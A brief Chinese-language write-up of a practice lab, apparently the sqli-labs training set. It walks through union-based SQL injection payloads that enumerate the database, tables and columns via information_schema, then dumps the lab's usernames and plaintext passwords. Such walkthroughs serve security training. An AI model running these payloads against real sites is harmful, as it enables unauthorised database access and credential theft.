#### lab1

简单的联合注入？

payload:

测显示位：

```sql
1'union select 1,2,3%23
```

爆数据库：

```sql
-1'union select 1,database(),3%23
```

爆表名：

```sql
-1'union select 1,2,group_concat(table_name)from(information_schema.tables)where table_schema=database()%23
```

爆字段：

```sql
-1'/**/union select 1,2,group_concat(column_name)from(information_schema.columns)where/**/table_name='users'%23
```

爆用户名和密码：

```sql
-1'/**/union select 1,group_concat(username),group_concat(password) from users %23
```

```
username:
Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
password:
Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
```

